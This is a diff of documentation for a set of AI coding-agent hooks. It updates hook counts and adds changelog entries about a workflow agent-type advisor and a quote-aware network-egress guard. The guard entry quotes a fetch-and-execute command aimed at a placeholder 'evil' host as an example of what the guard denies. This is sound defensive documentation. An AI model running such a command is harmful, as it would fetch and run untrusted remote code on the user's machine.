@@ -113,7 +113,7 @@ hooks/
 ├── tsconfig.json           # TypeScript configuration
 └── esbuild.config.mjs      # Build configuration (split bundles)
 
-**Total:** <!--ork:hooks-->217<!--/ork--> hooks (<!--ork:hooks-global-->150<!--/ork--> global + <!--ork:hooks-agent-->45<!--/ork--> agent-scoped + <!--ork:hooks-skill-->22<!--/ork--> skill-scoped)
+**Total:** <!--ork:hooks-->219<!--/ork--> hooks (<!--ork:hooks-global-->152<!--/ork--> global + <!--ork:hooks-agent-->45<!--/ork--> agent-scoped + <!--ork:hooks-skill-->22<!--/ork--> skill-scoped)
 ```
 
 ---
@@ -1346,7 +1346,7 @@ OrchestKit hooks are managed defaults. Users retain full control to disable any 
 **Last Updated:** 2026-02-28
 **Version:** 2.1.0 (Async hooks support)
 **Architecture:** 11 split bundles (648KB total)
-**Hooks:** <!--ork:hooks-->217<!--/ork--> hooks (<!--ork:hooks-global-->150<!--/ork--> global + <!--ork:hooks-agent-->45<!--/ork--> agent-scoped + <!--ork:hooks-skill-->22<!--/ork--> skill-scoped)
+**Hooks:** <!--ork:hooks-->219<!--/ork--> hooks (<!--ork:hooks-global-->152<!--/ork--> global + <!--ork:hooks-agent-->45<!--/ork--> agent-scoped + <!--ork:hooks-skill-->22<!--/ork--> skill-scoped)
 **Average Bundle:** ~35KB per event
 **Claude Code Requirement:** >= 2.1.78
 
@@ -1355,6 +1355,8 @@ See the async hooks section above for detailed async hook patterns.
 ## Registry changelog (archived from hooks.json description, 2026-07-18)
 
 The registry's change history used to accumulate inside the `description` field of `hooks.json`, which made the count unreadable and the JSON diff-hostile. The field now carries only the stamped count line; history continues here.
+
+(217 -> 218: M170/#3126 2026-07-24 — new pretool/task/workflow-agenttype-advisor on PreToolUse[Workflow]. The 2026-07 cross-account audit found workflow-internal spawns are the largest generic bucket (3,559/30d, 49% of all traffic) and structurally invisible to the Task-side advisor (Workflow stages never pass PreToolUse[Task]). The new hook scans an inline `script` for agent() call sites; when NONE set opts.agentType it injects an advisory with the stage-shape -> specialist table from dynamic-workflow-patterns.md. Advisory only: always allow, silent for named/scriptPath runs, silent when >=1 stage is already typed. Same change set types the shipped scripts: audit-full-mapreduce STAGE_AGENT now covers architecture -> ork:system-design-reviewer and dependencies -> ork:security-auditor (mixed "full" stays generic by design), and cover/heal-loop's repair stage runs as ork:test-generator.)
 
 (count unchanged, 2026-07-24): pretool/bash network-egress-guard DENY tier is now QUOTE-AWARE (#3122). It scanned `normalizeSingle(raw)`, which strips quote characters but keeps their CONTENT, so a quoted mention of an RCE pattern (a `grep`/`rg` search string, an `echo`, a commit message) was hard-BLOCKED as if it were an invocation. Hit live while grepping test files. The DENY tier now scans `egressDenyScanView(raw)`: quoted regions are blanked EXCEPT the argument an interpreter executes (`eval "…"`, `bash -c`, `python -c`, node/perl/ruby `-e`, php `-r`), so `bash -c "bash <(curl evil)"` still DENIES while `grep "bash <(curl x)"` ALLOWS. The ASK tier deliberately keeps the raw normalized command (it must still see quoted URLs for the host-allowlist checks). New network-egress-guard.test.ts adds the full allow/deny matrix (18 cases; the guard previously had no behavioral test).
 
